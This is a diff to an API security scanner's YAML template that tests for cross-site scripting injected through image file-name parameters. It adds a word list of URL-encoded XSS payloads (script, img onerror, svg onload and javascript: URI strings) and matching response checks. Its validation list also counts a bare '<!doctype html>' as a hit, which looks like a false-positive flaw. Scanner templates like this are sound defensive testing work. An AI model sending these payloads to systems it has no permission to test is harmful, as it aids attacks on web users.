@@ -8,7 +8,7 @@ info:
   impact: "An XSS vulnerability can have significant impacts, including the potential for data theft, unauthorized access, session hijacking, defacement of web pages, and the injection of malicious content."
   category:
     name: XSS
-    shortName: XXS
+    shortName: XSS
     displayName: Cross-site scripting (XSS)
   subCategory: XSS_VIA_FILE_NAME
   severity: HIGH
@@ -32,6 +32,8 @@ api_selection_filters:
       lt: 300
 
     response_payload:
+      length:
+        extract: original_length
       contains_either:
         - <!doctype html>
 
@@ -41,6 +43,10 @@ api_selection_filters:
             value:
               contains_either:
                   - .jpg
+                  - .jpeg
+                  - .png
+                  - .gif
+                  - .svg
             key:
               extract: jpg_file_name
       - query_param:
@@ -48,60 +54,49 @@ api_selection_filters:
             value:
               contains_either:
                   - .jpg
+                  - .jpeg
+                  - .png
+                  - .gif
+                  - .svg
             key:
               extract: jpg_file_name
 
-      - request_payload:
-          for_one:
-            value:
-              contains_either:
-                  - .jpeg
-            key:
-              extract: jpeg_file_name
-      - query_param:
-          for_one:
-            value:
-              contains_either:
-                  - .jpeg
-            key:
-              extract: jpeg_file_name
-
-      - request_payload:
-          for_one:
-            value:
-              contains_either:
-                  - .png
-            key:
-              extract: png_file_name
-      - query_param:
-          for_one:
-            value:
-              contains_either:
-                  - .png
-            key:
-              extract: png_file_name
+wordLists:
+  testPayloads:
+    - "%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg"
+    - "%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg"
+    - "%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png"
+    - "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E.jpg"
+    - "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E.jpg"
+    - "%3Csvg%2Fonload%3Dalert%28%27XSS%27%29%3E.jpg"
+    - "%3Cdiv%20style%3D%22background-image%3Aurl%28javascript%3Aalert%28%27XSS%27%29%29%3B%22%3E.jpg"
+    - "%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E.jpg"
+    - "jaVasCript%3A%2F%2Falert%28%27XSS%27%29.jpg"
 
 execute:
   type: single
   requests:
     - req:
       - modify_query_param:
-          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
+          jpg_file_name: "${testPayloads}"
       - modify_body_param:
-          jpg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpg'
+          jpg_file_name: "${testPayloads}"
 
-      - modify_query_param:
-          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
-      - modify_body_param:
-          jpeg_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.jpeg'
-
-      - modify_query_param:
-          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
-      - modify_body_param:
-          png_file_name: '%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E.png'
 
 validate:
   response_payload:
-    contains_either: "<script>alert(document.domain)</script>"
-  response_payload:
-    contains_either: <!doctype html>
+    contains_either: 
+    - "<script>alert(document.domain)</script>"
+    - "<!doctype html>"
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg/onload=alert('XSS')>"
+    - "<div style=\"background-image:url(javascript:alert('XSS'));\">"
+    - "<iframe src=\"javascript:alert('XSS')\"></iframe>"
+    - "jaVasCript://alert('XSS')"
+    - "<scr[null character]ipt>alert('XSS')</script>"
+    - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
+    - "jav[horizontal tab]ascript:alert('XSS')"
+    - "<script src=data:,alert('XSS')>"
+    length:
+      neq: ${original_length}
